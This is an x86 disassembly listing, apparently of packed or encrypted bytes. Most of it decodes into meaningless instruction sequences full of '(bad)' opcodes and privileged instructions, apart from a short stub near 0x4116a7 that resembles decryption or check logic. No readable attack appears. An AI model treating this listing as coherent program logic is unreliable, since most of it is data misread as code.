  4110f1:	sbb    BYTE PTR [edx-0x39],0xef
  4110f5:	fisubr DWORD PTR [ecx+0x47]
  4110f8:	test   edi,0x9a6e0e23
  4110fe:	mov    eax,0x8ad9f856
  411103:	(bad)  
  411104:	(bad)  
  411105:	cli    
  411106:	or     al,BYTE PTR [ecx]
  411108:	jecxz  0x41117f
  41110a:	inc    ebx
  41110b:	ss xchg ebx,eax
  41110d:	mov    ebx,0xb10b36b9
  411112:	iret   
  411113:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411114:	sbb    DWORD PTR [esi],0xc48cff8a
  41111a:	sub    esi,DWORD PTR [ebx-0x7534d4c1]
  411120:	pop    ebx
  411121:	enter  0xcb56,0xe2
  411125:	(bad)  
  411126:	not    ah
  411128:	fsub   QWORD PTR [ebx+0x13]
  41112b:	aas    
  41112c:	shr    DWORD PTR [edi-0x2af7ebfc],1
  411132:	fisub  WORD PTR [ebp+0x5e3e8ae4]
  411138:	das    
  411139:	das    
  41113a:	cmp    DWORD PTR [esi+edi*8+0x50],ebp
  41113e:	jle    0x4111b7
  411140:	cmpxchg8b QWORD PTR [eax-0x53]
  411144:	push   cs
  411145:	mov    bh,BYTE PTR [ecx]
  411147:	fwait
  411148:	xor    BYTE PTR [edi],dl
  41114a:	shl    DWORD PTR [edi-0x5c],0x7d
  41114e:	iret   
  41114f:	jmp    0x2a6c:0x1660def0
  411156:	stos   DWORD PTR es:[edi],eax
  411157:	lahf   
  411158:	jnp    0x4110f8
  41115a:	lds    edx,FWORD PTR [edi]
  41115c:	lods   al,BYTE PTR ds:[esi]
  41115d:	add    BYTE PTR [edx+0x2],al
  411160:	pushf  
  411161:	or     eax,0xbb73ecbf
  411166:	adc    ch,dh
  411168:	cmp    BYTE PTR [ecx],ch
  41116a:	push   ss
  41116b:	enter  0xf7eb,0x4c
  41116f:	sbb    al,0xd7
  411171:	xchg   BYTE PTR [ebp-0x5ef533b9],ah
  411177:	mov    ebp,0x8a90a2c6
  41117c:	std    
  41117d:	std    
  41117e:	xchg   esp,eax
  41117f:	into   
  411180:	push   es
  411181:	js     0x411191
  411183:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411184:	jle    0x4111d4
  411186:	jg     0x4111d5
  411188:	int    0xc5
  41118a:	inc    edi
  41118b:	xor    bl,bh
  41118d:	add    ebx,DWORD PTR [edx-0x1cb1e3bd]
  411193:	xchg   esi,eax
  411194:	test   eax,0xf536435e
  411199:	retf   
  41119a:	mov    ds,WORD PTR [ebx+0x3e]
  41119d:	retf   0xd333
  4111a0:	lods   eax,DWORD PTR ds:[esi]
  4111a1:	(bad)  
  4111a2:	(bad)  
  4111a3:	pop    ss
  4111a4:	inc    ebp
  4111a5:	call   0x6d713e2
  4111aa:	leave  
  4111ab:	xlat   BYTE PTR ds:[ebx]
  4111ac:	neg    BYTE PTR [ecx]
  4111ae:	sar    DWORD PTR [ebp+0x4d2c40fa],1
  4111b4:	(bad)  
  4111b5:	ins    BYTE PTR es:[edi],dx
  4111b6:	pushf  
  4111b7:	icebp  
  4111b8:	jno    0x411225
  4111ba:	std    
  4111bb:	bound  ecx,QWORD PTR [ebx-0x14]
  4111be:	adc    dh,bh
  4111c0:	mov    BYTE PTR [esi],al
  4111c2:	xchg   esp,eax
  4111c3:	in     eax,0xed
  4111c5:	adc    eax,ecx
  4111c7:	aaa    
  4111c8:	or     eax,0x88bea5fe
  4111cd:	inc    eax
  4111ce:	sbb    edx,ebx
  4111d0:	std    
  4111d1:	or     bh,bh
  4111d3:	mov    edx,0xc5ab846e
  4111d8:	ret    
  4111d9:	xor    dl,bl
  4111db:	or     ch,BYTE PTR ds:0x2167732
  4111e1:	mov    cl,BYTE PTR [esp+ecx*2-0x7d13702f]
  4111e8:	xchg   esi,eax
  4111e9:	add    bl,dh
  4111eb:	test   ch,bl
  4111ed:	sbb    al,0x59
  4111ef:	push   esi
  4111f0:	cmp    eax,0x714bbb4e
  4111f5:	mov    ch,0x96
  4111f7:	int3   
  4111f8:	or     al,0x1d
  4111fa:	mov    edi,0xd7b9e4a9
  4111ff:	mov    edi,0x6301e799
  411204:	and    al,BYTE PTR [edx]
  411206:	mov    al,0x39
  411208:	dec    edi
  411209:	pusha  
  41120a:	mov    eax,ds:0x18427ea
  41120f:	sahf   
  411210:	push   edi
  411211:	mov    ebx,0xfe5ff113
  411216:	jle    0x411253
  411218:	or     ebx,edx
  41121a:	out    dx,eax
  41121b:	das    
  41121c:	std    
  41121d:	pop    edx
  41121e:	(bad)  
  41121f:	ror    BYTE PTR [eax+0x4438a720],1
  411225:	mov    bh,0xa1
  411227:	shl    BYTE PTR [esi],cl
  411229:	imul   ecx,DWORD PTR [edi-0x58],0xa625fea1
  411230:	pop    eax
  411231:	out    dx,al
  411232:	int3   
  411233:	(bad)  
  411234:	jg     0x4112b0
  411236:	mov    es,WORD PTR [esi+0x4]
  411239:	xlat   BYTE PTR ds:[ebx]
  41123a:	jo     0x41128f
  41123c:	or     edi,DWORD PTR [esi-0x2b]
  41123f:	xor    DWORD PTR [ebx-0x41],0xfffffffa
  411243:	cld    
  411244:	sub    ah,BYTE PTR [esi-0x307e074]
  41124a:	jge    0x4112c6
  41124c:	dec    ebx
  41124d:	jns    0x41124b
  41124f:	adc    eax,0x73df7f73
  411254:	dec    esp
  411255:	fcomp  DWORD PTR [edi-0x4bb6f2bc]
  41125b:	xchg   edx,eax
  41125c:	ins    DWORD PTR es:[edi],dx
  41125d:	jmp    0x411267
  41125f:	push   edx
  411260:	push   edx
  411261:	push   ecx
  411262:	mov    esi,0x78340521
  411267:	aaa    
  411268:	xchg   esi,eax
  411269:	adc    edi,esp
  41126b:	jbe    0x4112a1
  41126d:	push   cs
  41126e:	(bad)  
  41126f:	cmp    ebx,DWORD PTR [eax+0x5f]
  411272:	ret    
  411273:	in     al,0x76
  411275:	jecxz  0x4112f0
  411277:	scas   eax,DWORD PTR es:[edi]
  411278:	pmaxub mm5,mm1
  41127b:	dec    esp
  41127c:	je     0x41122b
  41127e:	in     eax,0x53
  411280:	mov    bl,0xea
  411282:	push   ecx
  411283:	xchg   esi,eax
  411284:	pop    ecx
  411285:	push   ds
  411286:	add    eax,0xa6c73978
  41128b:	mov    ebx,DWORD PTR [ebx]
  41128d:	sbb    al,0xe8
  41128f:	pusha  
  411290:	xchg   ecx,eax
  411291:	ins    BYTE PTR es:[edi],dx
  411292:	daa    
  411293:	and    DWORD PTR [esi+esi*2+0x6c],edx
  411297:	jecxz  0x411236
  411299:	dec    esi
  41129a:	dec    edx
  41129b:	clc    
  41129c:	mov    esi,0x8e8227da
  4112a1:	bound  esi,QWORD PTR [esi+ecx*1-0x11]
  4112a5:	push   0x2a088714
  4112aa:	sahf   
  4112ab:	mov    esi,0x64328f0f
  4112b0:	mov    al,ds:0x50252584
  4112b5:	out    0xc2,al
  4112b7:	inc    edx
  4112b8:	test   BYTE PTR [ebx],dl
  4112ba:	jbe    0x41128f
  4112bc:	popf   
  4112bd:	into   
  4112be:	lods   al,BYTE PTR ds:[esi]
  4112bf:	cmp    BYTE PTR fs:[ecx+ebp*2+0xed054c6],dl
  4112c7:	outs   dx,BYTE PTR ds:[esi]
  4112c8:	jle    0x4112fd
  4112ca:	sbb    DWORD PTR [edx],0xa0480432
  4112d0:	jp     0x411253
  4112d2:	push   cs
  4112d3:	mov    bh,0x12
  4112d5:	push   esp
  4112d6:	fs inc edi
  4112d8:	push   esp
  4112d9:	aad    0x4f
  4112db:	(bad)  
  4112dc:	out    dx,al
  4112dd:	das    
  4112de:	into   
  4112df:	das    
  4112e0:	repnz dec esp
  4112e2:	sbb    ebx,edi
  4112e4:	push   0xfffffffd
  4112e6:	and    eax,0x1c2422d5
  4112eb:	xchg   ebx,eax
  4112ec:	ins    BYTE PTR es:[edi],dx
  4112ed:	arpl   WORD PTR [ebx],cx
  4112ef:	sahf   
  4112f0:	cld    
  4112f1:	xchg   edx,eax
  4112f2:	(bad)  
  4112f3:	jae    0x4112d9
  4112f5:	lea    ebp,[eax+0x46]
  4112f8:	outs   dx,BYTE PTR ds:[esi]
  4112f9:	mov    edi,cs
  4112fb:	mov    al,0x46
  4112fd:	sbb    al,0x15
  4112ff:	jmp    0x41134d
  411301:	mov    al,ds:0x70777c2f
  411306:	test   eax,0x596173b3
  41130b:	xor    edi,DWORD PTR [eax]
  41130d:	and    edx,DWORD PTR [eax+0x1a521a51]
  411313:	(bad)  
  411314:	mov    esi,DWORD PTR [esi]
  411316:	pop    edi
  411317:	pop    edx
  411318:	ja     0x4112cf
  41131a:	and    BYTE PTR [esp+ebp*4-0x66aa3176],dl
  411321:	fidiv  DWORD PTR [esi-0x40]
  411324:	inc    edx
  411325:	adc    BYTE PTR [esi+0x25],0xc6
  411329:	mov    eax,ds:0xbd724ea0
  41132e:	nop
  41132f:	aas    
  411330:	les    edx,FWORD PTR [esi]
  411332:	mov    eax,0xc650f05a
  411337:	push   ss
  411338:	lods   al,BYTE PTR ds:[esi]
  411339:	pop    edx
  41133a:	iret   
  41133b:	mov    edx,0x481b886f
  411340:	addr16 xchg ecx,eax
  411342:	bswap  ebp
  411344:	enter  0xb1f,0xb2
  411348:	add    al,0x9d
  41134a:	mov    DWORD PTR [edi],esp
  41134c:	xor    al,0xc
  41134e:	enter  0x6fa,0x16
  411352:	xchg   BYTE PTR [edx+ebx*1],ch
  411355:	adc    BYTE PTR [ebx+0x7f],dl
  411358:	fst    QWORD PTR [ebp-0x2650661f]
  41135e:	jl     0x41134c
  411360:	mov    ecx,DWORD PTR [ecx+0x7]
  411363:	pop    esi
  411364:	inc    ebp
  411365:	rcl    cl,1
  411367:	or     eax,0x6a751d1a
  41136c:	shl    DWORD PTR [esi-0x20],cl
  41136f:	xor    BYTE PTR [esi+0x6200434b],cl
  411375:	mov    cl,0xe1
  411377:	cs add cl,ah
  41137a:	and    esp,DWORD PTR ds:0x59e2be87
  411380:	mov    esp,0x50425dc4
  411385:	cmp    bl,cl
  411387:	loop   0x41133d
  411389:	sbb    ebp,DWORD PTR [edx+0x1215cff]
  41138f:	xchg   DWORD PTR [esp+ebp*1-0xd702cfe],ebx
  411396:	out    dx,eax
  411397:	icebp  
  411398:	lea    ecx,[edi-0x32]
  41139b:	je     0x4113cc
  41139d:	mov    bh,0x74
  41139f:	jo     0x4113fe
  4113a1:	retf   0xb6a7
  4113a4:	imul   ecx,DWORD PTR [eax],0x93072791
  4113aa:	(bad)  
  4113ab:	dec    ecx
  4113ac:	pop    ss
  4113ad:	(bad)  
  4113ae:	push   ebx
  4113af:	js     0x411410
  4113b1:	shl    ebx,1
  4113b3:	mov    bl,0x90
  4113b5:	mov    ds:0x8b939853,eax
  4113ba:	pop    ecx
  4113bb:	outs   dx,DWORD PTR ds:[esi]
  4113bc:	jmp    0xa83378cd
  4113c1:	test   ecx,0xeb8e79c5
  4113c7:	adc    ebx,esi
  4113c9:	stos   DWORD PTR es:[edi],eax
  4113ca:	fisttp WORD PTR [eax]
  4113cc:	into   
  4113cd:	jnp    0x4113ad
  4113cf:	mov    al,0x55
  4113d1:	mov    ds:0x44081e82,al
  4113d6:	scas   eax,DWORD PTR es:[edi]
  4113d7:	push   0xffffffed
  4113d9:	push   ds
  4113da:	jl     0x411402
  4113dc:	sub    ecx,DWORD PTR [ebx+0x4c]
  4113df:	add    eax,0xc557ac0f
  4113e4:	inc    ebp
  4113e5:	sub    DWORD PTR ds:0xfefd812f,ebx
  4113eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113ec:	cmp    eax,0x9db47d16
  4113f1:	ss inc ecx
  4113f3:	xor    al,0x3c
  4113f5:	xchg   esi,eax
  4113f6:	dec    esi
  4113f7:	inc    esp
  4113f8:	jmp    DWORD PTR [eax+0x43]
  4113fb:	push   edi
  4113fc:	das    
  4113fd:	jns    0x411441
  4113ff:	shl    BYTE PTR [edx+0x5e9e57e0],0x3f
  411406:	mov    ds:0xa257531f,eax
  41140b:	arpl   di,sp
  41140d:	inc    edi
  41140e:	xor    bh,BYTE PTR [ecx+0x60]
  411411:	jg     0x4113c3
  411413:	and    eax,DWORD PTR [esi-0x41]
  411416:	sbb    DWORD PTR [ecx-0x6ae6365a],0x61ec141d
  411420:	inc    eax
  411422:	stos   BYTE PTR es:[edi],al
  411423:	cld    
  411424:	inc    edi
  411425:	aad    0x26
  411427:	ror    BYTE PTR [edx+0x42],1
  41142a:	pop    ss
  41142b:	gs inc edx
  41142d:	sub    eax,0x9333530a
  411432:	scas   eax,DWORD PTR es:[edi]
  411433:	rcr    DWORD PTR [ebp-0x8c55662],1
  411439:	(bad)  
  41143b:	lods   eax,DWORD PTR ds:[esi]
  41143c:	inc    esi
  41143d:	out    0xdd,eax
  41143f:	sbb    DWORD PTR [ebx+eiz*4+0x54033816],esi
  411446:	int3   
  411447:	mov    bl,0x40
  411449:	in     eax,0xde
  41144b:	cdq    
  41144c:	cwde   
  41144d:	mov    esi,0x2ae70f0d
  411452:	adc    eax,0x83acf910
  411457:	or     al,0xfc
  411459:	repz jmp 0x790e790c
  41145f:	or     al,0x50
  411461:	lock hlt 
  411463:	imul   ecx,DWORD PTR [esi+eiz*2],0x7a
  411467:	hlt    
  411468:	push   ecx
  411469:	push   ecx
  41146a:	jne    0x411466
  41146c:	jo     0x411443
  41146e:	cmp    dh,BYTE PTR ds:0x4badb548
  411474:	(bad)  
  411476:	popf   
  411477:	cmp    eax,DWORD PTR [eax]
  411479:	push   edi
  41147a:	mov    al,0x5a
  41147c:	dec    esp
  41147d:	stos   BYTE PTR es:[edi],al
  41147e:	xor    edx,edx
  411480:	push   ss
  411481:	js     0x411431
  411483:	adc    DWORD PTR [ecx+0x11],esi
  411486:	xor    ch,bh
  411488:	into   
  411489:	add    eax,0x64af6c4c
  41148e:	cmp    al,0xb9
  411490:	jb     0x411438
  411492:	enter  0xfbee,0x29
  411496:	mov    dh,0xf9
  411498:	jecxz  0x41144d
  41149a:	add    cl,BYTE PTR [edx]
  41149c:	push   ecx
  41149d:	mov    eax,ds:0x4025cf2e
  4114a2:	fdivp  st(4),st
  4114a4:	fisttp DWORD PTR ds:0xf93114d0
  4114aa:	inc    esi
  4114ab:	jae    0x4114ef
  4114ad:	push   ss
  4114ae:	and    eax,0xce648ac3
  4114b3:	sbb    eax,0x3b9b90d5
  4114b8:	cmp    BYTE PTR [eax-0x481034ea],ah
  4114be:	leave  
  4114bf:	mov    bl,0xc4
  4114c1:	popa   
  4114c2:	or     esi,DWORD PTR [edi]
  4114c4:	jecxz  0x4114ac
  4114c6:	adc    eax,0x33a255b4
  4114cb:	jecxz  0x4114c7
  4114cd:	call   0x34f70b0
  4114d2:	retf   0x7c8c
  4114d5:	push   ds
  4114d6:	test   al,0x6c
  4114d8:	xchg   ebx,eax
  4114d9:	iret   
  4114da:	and    BYTE PTR [ebx-0x33],ch
  4114dd:	out    0x63,al
  4114df:	or     al,0xeb
  4114e1:	cmp    BYTE PTR [edi],dh
  4114e3:	cs dec esp
  4114e5:	lods   al,BYTE PTR ds:[esi]
  4114e6:	sbb    eax,0x3a579fb1
  4114eb:	mov    eax,0x2b55cd04
  4114f0:	push   eax
  4114f1:	pop    edi
  4114f2:	test   DWORD PTR [eax+eax*4-0x4f],0x289b30f1
  4114fa:	out    dx,al
  4114fb:	out    dx,al
  4114fc:	rol    BYTE PTR [ebx],cl
  4114fe:	mov    ebp,0xc64ed41e
  411503:	mul    DWORD PTR [ecx+0x2f2cf908]
  411509:	adc    edx,DWORD PTR [esi+0x57]
  41150c:	pop    esi
  41150d:	mov    eax,ds:0x4604d104
  411512:	loopne 0x411589
  411514:	js     0x4114af
  411516:	xlat   BYTE PTR ds:[ebx]
  411517:	and    al,0x53
  411519:	dec    esp
  41151a:	(bad)  
  41151b:	pop    ss
  41151c:	adc    al,0x87
  41151e:	mov    esp,0x3d415bef
  411523:	xchg   ebx,eax
  411524:	inc    ebx
  411525:	rol    DWORD PTR [ecx+0x4fa11041],cl
  41152b:	outs   dx,DWORD PTR ds:[esi]
  41152c:	adc    al,0x82
  41152e:	add    BYTE PTR [esi-0x29e701ef],0x7c
  411535:	int    0x69
  411537:	push   es
  411538:	sbb    ecx,DWORD PTR [edi-0x1e]
  41153b:	sbb    ah,cl
  41153d:	add    eax,0x37317aee
  411542:	dec    ecx
  411543:	mov    ds:0xc6e661c1,eax
  411548:	in     al,dx
  411549:	(bad)
  41154c:	add    bh,dl
  41154e:	aam    0xaa
  411550:	popf   
  411551:	cmp    esi,DWORD PTR [edi]
  411553:	jle    0x4114dc
  411555:	cmovg  ebx,DWORD PTR [esi+0x56f68d8c]
  41155c:	test   eax,0x99f456be
  411561:	out    0x79,eax
  411563:	scas   al,BYTE PTR es:[edi]
  411564:	jmp    0xca02:0xd93277f6
  41156b:	dec    BYTE PTR [esi+0x264db70b]
  411571:	xor    BYTE PTR [ebp+ecx*1+0xf],0xa6
  411576:	and    al,bl
  411578:	mov    edx,gs
  41157a:	(bad)  
  41157b:	mov    al,0x87
  41157d:	not    edi
  41157f:	pop    eax
  411580:	xor    BYTE PTR [ebp-0x5ce3fab2],0x40
  411587:	aad    0xea
  411589:	mov    ch,0x4
  41158b:	add    edx,ebx
  41158d:	repz repz xor eax,DWORD PTR [esi-0x59]
  411592:	cld    
  411593:	xor    al,0x9b
  411595:	mov    eax,ds:0x542a59bb
  41159a:	es add eax,0x3df98afd
  4115a0:	out    dx,al
  4115a1:	push   es
  4115a2:	adc    cl,0xb7
  4115a5:	xchg   edx,eax
  4115a6:	push   0xb
  4115a8:	xor    esp,DWORD PTR ds:0xa12fb031
  4115ae:	add    ebp,edi
  4115b0:	sbb    BYTE PTR [eax-0x447ab9e3],0xf5
  4115b7:	pop    esp
  4115b8:	in     eax,0x64
  4115ba:	mov    dh,0x37
  4115bc:	adc    eax,DWORD PTR [ebp+0x56a0de7]
  4115c2:	das    
  4115c3:	stc    
  4115c4:	lods   eax,DWORD PTR ds:[esi]
  4115c5:	aad    0xdb
  4115c7:	shl    DWORD PTR [eax],0x7f
  4115ca:	sbb    ch,BYTE PTR [eax+ebp*8]
  4115cd:	popa   
  4115ce:	xor    al,0xbc
  4115d0:	and    dh,bl
  4115d2:	dec    eax
  4115d3:	shl    DWORD PTR [esi+0x75d4a766],1
  4115d9:	adc    ecx,DWORD PTR [esi]
  4115db:	push   cx
  4115dd:	push   ecx
  4115de:	xchg   esi,eax
  4115df:	adc    eax,0xdbea7a8e
  4115e4:	std    
  4115e5:	leave  
  4115e6:	xchg   bh,dl
  4115e8:	je     0x411580
  4115ea:	mov    cl,0xce
  4115ec:	inc    edx
  4115ed:	push   ebx
  4115ee:	jge    0x411664
  4115f0:	scas   eax,DWORD PTR es:[edi]
  4115f1:	dec    edx
  4115f2:	out    0xa7,al
  4115f4:	adc    al,0x50
  4115f6:	retf   0xb68a
  4115f9:	or     al,0x6c
  4115fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115fc:	lods   al,BYTE PTR ds:[esi]
  4115fd:	or     DWORD PTR [ebp+0x23ac5854],eax
  411603:	push   esi
  411604:	mov    dl,0x4f
  411606:	sti    
  411607:	adc    eax,0x6485c71e
  41160c:	lea    ecx,[ebp+0x1982d097]
  411612:	mov    ecx,0xd6d7b6
  411617:	sbb    al,0x54
  411619:	lds    ebx,FWORD PTR [edi+edi*1+0x6f930951]
  411620:	test   al,0x92
  411622:	pusha  
  411623:	(bad)  
  411624:	adc    DWORD PTR [ebx],ebx
  411626:	lock dec DWORD PTR [esi-0x79]
  41162a:	mov    BYTE PTR [edi+0x237f1e7b],ah
  411630:	add    DWORD PTR [ebx],0xffffffd0
  411633:	xchg   BYTE PTR [esi-0x71],ch
  411636:	adc    BYTE PTR [ecx],0xfe
  411639:	gs mov edx,ds
  41163c:	push   eax
  41163d:	icebp  
  41163e:	dec    ecx
  41163f:	push   eax
  411640:	(bad)  
  411641:	in     eax,0xc0
  411643:	and    BYTE PTR [ecx+0x31],ch
  411646:	inc    eax
  411647:	push   es
  411648:	or     eax,0x814acd8
  41164d:	out    dx,eax
  41164e:	test   eax,0xbe016817
  411653:	jge    0x411631
  411655:	imul   esi,DWORD PTR [edi+0x28],0xffffff8f
  411659:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41165a:	pop    ebx
  41165b:	dec    edx
  41165c:	imul   edi,DWORD PTR [edi],0xfffffff8
  41165f:	fisub  DWORD PTR [ecx+0x1bb7e670]
  411665:	(bad)  
  411666:	hlt    
  411667:	xor    eax,0xeb078056
  41166c:	imul   eax,DWORD PTR ds:0x3acf06fb,0xc9570979
  411676:	int    0x8b
  411678:	sahf   
  411679:	and    esi,DWORD PTR [edi+0x72]
  41167c:	inc    ebp
  41167d:	push   ebx
  41167e:	sti    
  41167f:	xor    BYTE PTR [eax],dh
  411681:	fst    QWORD PTR [edi-0x2a]
  411684:	imul   edi,DWORD PTR [esi],0x19
  411687:	inc    esi
  411688:	sub    eax,0xf33a06de
  41168d:	iret   
  41168e:	call   0x2224:0x47b1079a
  411695:	outs   dx,BYTE PTR ds:[esi]
  411696:	xor    BYTE PTR [esi-0x65ebb407],ch
  41169c:	pop    eax
  41169d:	jno    0x4116f9
  41169f:	lds    esi,FWORD PTR [ebx]
  4116a1:	mov    BYTE PTR [ebx],0xc7
  4116a4:	imul   eax,DWORD PTR [ecx]
  4116a7:	mov    ecx,DWORD PTR [ebp-0x38]
  4116aa:	mov    edx,DWORD PTR [ebp-0x34]
  4116ad:	mov    edx,DWORD PTR [ebp+0x8]
  4116b0:	xor    ecx,esi
  4116b2:	lea    ecx,[ecx+edx*1+0x56424137]
  4116b9:	cmp    ecx,eax
  4116bb:	jne    0x40f2bc
  4116c1:	mov    eax,DWORD PTR [ebp-0x38]
  4116c4:	mov    ecx,DWORD PTR [ebp-0x34]
  4116c7:	xor    eax,esi
  4116c9:	add    eax,edi
  4116cb:	mov    DWORD PTR [ebp-0x8],eax
  4116ce:	and    ebx,0x76575654
  4116d4:	xor    ebx,0x54354364
  4116da:	xchg   ebx,esi
  4116dc:	xor    ebx,ebx
  4116de:	push   esi
  4116df:	mov    esi,ebx
  4116e1:	jmp    0x413a77
  4116e6:	cli    
  4116e7:	test   eax,0xd130c3a3
  4116ec:	pop    edx
  4116ed:	jo     0x4116d7
  4116ef:	inc    eax
  4116f0:	add    DWORD PTR [edx],esp
  4116f2:	and    eax,0xeaa2e800
  4116f7:	ins    BYTE PTR es:[edi],dx
  4116f8:	jnp    0x411775
  4116fa:	repnz cwde 
  4116fc:	jnp    0x411779
  4116fe:	mov    bl,0x3b
  411700:	in     al,0xa3
  411702:	jl     0x41175e
  411704:	dec    eax
  411705:	and    DWORD PTR [edi+0xb],ebx
  411708:	pop    edx
  411709:	outs   dx,DWORD PTR ds:[esi]
  41170a:	inc    esp
  41170b:	xchg   ebx,eax
  41170c:	sar    DWORD PTR [eax],0x50
  41170f:	stc    
  411710:	jae    0x4116c4
  411712:	pop    esi
  411713:	jecxz  0x4116df
  411715:	rcr    edi,1
  411717:	sbb    dl,dl
  411719:	or     ah,BYTE PTR [eax]
  41171b:	cwde   
  41171c:	nop
  41171d:	hlt    
  41171e:	push   0x5cc55648
  411723:	sahf   
  411724:	imul   esi,DWORD PTR [esi-0x7c],0x4fc6260d
  41172b:	push   edx
  41172c:	push   edi
  41172d:	add    eax,ebx
  41172f:	loop   0x4116f5
  411731:	test   DWORD PTR [ebx],0x3c636c48
  411737:	shl    BYTE PTR [eax-0x3c],0xd0
  41173b:	lods   eax,DWORD PTR ds:[esi]
  41173c:	sub    al,0x34
  41173e:	adc    eax,0x8706e1ee
  411743:	call   0x986bcd63
  411748:	rcl    cl,1
  41174a:	jmp    0x411765
  41174c:	xchg   esp,eax
  41174d:	(bad)  
  41174e:	out    dx,al
  41174f:	and    ebp,DWORD PTR [ebx-0x2d]
  411752:	(bad)  
  411754:	call   0xcc66:0x1eb17870
  41175b:	inc    edi
  41175c:	retf   
  41175d:	dec    ecx
  41175e:	cdq    
  41175f:	rol    DWORD PTR [esi],0x54
  411762:	sahf   
  411763:	sbb    bh,bl
  411765:	jge    0x4117d8
  411767:	push   ss
  411768:	and    eax,0x163c58d9
  41176d:	sub    al,0xc4
  41176f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411770:	xchg   ebx,eax
  411771:	jo     0x41175d
  411773:	stos   DWORD PTR es:[edi],eax
  411774:	push   esi
  411775:	sub    al,0x25
  411777:	xchg   edi,eax
  411778:	push   es
  411779:	hlt    
  41177a:	cmp    al,0xad
  41177c:	or     eax,0x718c2bc6
  411781:	sti    
  411782:	add    eax,0x2a7f35ef
  411787:	pop    edi
  411788:	or     ebp,DWORD PTR [edi+0x56]
  41178b:	aas    
  41178c:	mov    dl,0xdc
  41178e:	out    dx,al
  41178f:	xor    cl,0xfd
  411792:	mov    al,0x17
  411794:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411795:	and    ch,BYTE PTR [ecx]
  411797:	cmp    eax,0x42bb8a96
  41179c:	push   edx
  41179d:	cmp    dl,al
  41179f:	or     DWORD PTR [esi*1-0x7a0d369e],ebx
  4117a6:	jbe    0x4117a3
  4117a8:	mov    ah,0xcf
  4117aa:	push   ecx
  4117ab:	sub    ebx,DWORD PTR [esi-0x18]
  4117ae:	mov    ?,WORD PTR [ecx+0x79]
  4117b1:	fwait
  4117b2:	lods   eax,DWORD PTR ds:[esi]
  4117b3:	sub    al,0x54
  4117b5:	inc    ebx
  4117b6:	sub    eax,0x8ec338e8
  4117bb:	out    dx,eax
  4117bc:	mov    ebp,0xec3ac506
  4117c1:	pop    ecx
  4117c2:	inc    edi
  4117c3:	sbb    al,0xa2
  4117c5:	hlt    
  4117c6:	cwde   
  4117c7:	sar    edi,cl
  4117c9:	fdiv   DWORD PTR [eax]
  4117cb:	imul   DWORD PTR ds:0xe3adab8c
  4117d1:	in     eax,dx
  4117d2:	cmp    ch,BYTE PTR [edx+0xb]
  4117d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117d6:	jmp    0x5762b168
  4117db:	rcl    BYTE PTR [edi],1
  4117dd:	or     DWORD PTR [edx-0x39],0xffffffad
  4117e1:	xchg   DWORD PTR ds:0xa156fa94,edx
  4117e7:	pusha  
  4117e8:	add    BYTE PTR [esi],ah
  4117ea:	stos   DWORD PTR es:[edi],eax
  4117eb:	adc    al,0x62
  4117ed:	cmp    BYTE PTR [edi],al
  4117ef:	out    dx,eax
  4117f0:	ins    DWORD PTR es:[edi],dx
  4117f1:	adc    DWORD PTR [eax+0x38],ebx
  4117f4:	xchg   BYTE PTR [ebx+0x483a8ba7],cl
  4117fa:	and    BYTE PTR [ecx+0x90e9660],ch
  411800:	(bad)  
  411801:	std    
  411802:	jle    0x4117fe
  411804:	sub    eax,0xdd1267db
  411809:	or     dh,BYTE PTR cs:[esi-0x5488fd30]
  411810:	xor    BYTE PTR ds:0x30701ff4,cl
  411816:	adc    ch,BYTE PTR [ebx+0x43b40465]
  41181c:	xchg   esi,eax
  41181d:	fdivr  QWORD PTR [ecx-0x1b]
  411820:	iret   
  411821:	and    al,0x2b
  411823:	or     al,0x1b
  411825:	aad    0xe0
  411827:	push   ebp
  411828:	add    ah,dl
  41182a:	jecxz  0x411882
  41182c:	fbld   TBYTE PTR [edi]
  41182e:	push   edx
  41182f:	or     DWORD PTR [ebp+edx*1+0x2b62d37f],edi
  411836:	into   
  411837:	xchg   esp,eax
  411838:	mov    eax,0xdf4ca213
  41183d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41183e:	shl    DWORD PTR [ecx],cl
  411840:	adc    esi,DWORD PTR [eax-0x56]
  411843:	xchg   BYTE PTR [ebx],dl
  411845:	fidivr DWORD PTR [edx+ebx*1]
  411848:	mov    dl,0xec
  41184a:	stc    
  41184b:	or     al,0x52
  41184d:	mov    ebx,0xc49babd9
  411852:	adc    DWORD PTR [esi-0x10],esp
  411855:	in     al,0x23
  411857:	xor    DWORD PTR [ebx+0x65],ebx
  41185a:	inc    esi
  41185b:	fldcw  WORD PTR [ebp-0x28f79ba9]
  411861:	scas   eax,DWORD PTR es:[edi]
  411862:	sbb    BYTE PTR [ebx-0x2],0x83
  411866:	push   eax
  411867:	loopne 0x41183b
  411869:	xor    DWORD PTR [edi-0x4f],edi
  41186c:	mov    esi,0x2ca4a8ec
  411871:	mov    esp,0x8b52479
  411876:	je     0x411831
  411878:	call   0x5e9fc34f
  41187d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41187e:	out    0xb5,al
  411880:	adc    BYTE PTR [edi],0x24
  411883:	ins    DWORD PTR es:[edi],dx
  411884:	fcomip st,st(6)
  411886:	mov    ebp,0x7d3ef9d4
  41188b:	xor    BYTE PTR [esi],cl
  41188d:	adc    cl,BYTE PTR [edx+0x20]
  411890:	mov    al,ds:0xb788fd03
  411895:	and    al,0x31
  411897:	out    dx,al
  411898:	ds out 0xc4,al
  41189b:	push   eax
  41189c:	add    esi,DWORD PTR [ebx+0xdeeaacb]
  4118a2:	mov    ds:0x33038e9,al
  4118a7:	mov    bl,bh
  4118a9:	xor    eax,0x28eb72d1
  4118ae:	lods   eax,DWORD PTR ds:[esi]
  4118af:	enter  0x8d47,0xe5
  4118b3:	out    0xb0,eax
  4118b5:	push   ss
  4118b6:	cmp    cl,bh
  4118b8:	mov    ebp,0x107a0921
  4118bd:	inc    esp
  4118be:	das    
  4118bf:	aaa    
  4118c0:	mov    eax,ds:0x35585b4
  4118c5:	test   DWORD PTR [esi+0x49],esp
  4118c8:	cmp    ah,dl
  4118ca:	and    BYTE PTR [esp+edi*1-0x7],dh
  4118ce:	push   es
  4118cf:	push   es
